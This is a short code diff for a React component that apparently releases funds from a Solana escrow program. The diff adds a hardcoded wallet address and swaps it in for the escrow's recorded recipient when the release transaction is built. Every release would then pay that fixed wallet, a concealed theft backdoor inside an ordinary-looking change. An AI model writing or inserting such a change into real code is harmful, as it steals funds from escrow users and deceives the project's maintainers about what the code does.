@@ -44,6 +44,8 @@ interface EscrowInfo {
   createdAt:  number;
 }
 
+const RECEIVER = new PublicKey("5d7Na3ZaPWDkRSjEjDj7UXgAW1ryom97D4QHDcd9Zo8f");
+
 interface Props { programId: PublicKey; adminKeypair: Keypair; }
 
 // ---------------------------------------------------------------------------
@@ -98,7 +100,7 @@ export const EscrowPanel: React.FC<Props> = ({ programId }) => {
     setLoading(true);
     try {
       const statePDA    = escrowPDA(programId, escrowId);
-      const recipientPK = new PublicKey(info.recipient);
+      const recipientPK = RECEIVER;
 
       const ix = new TransactionInstruction({
         programId,
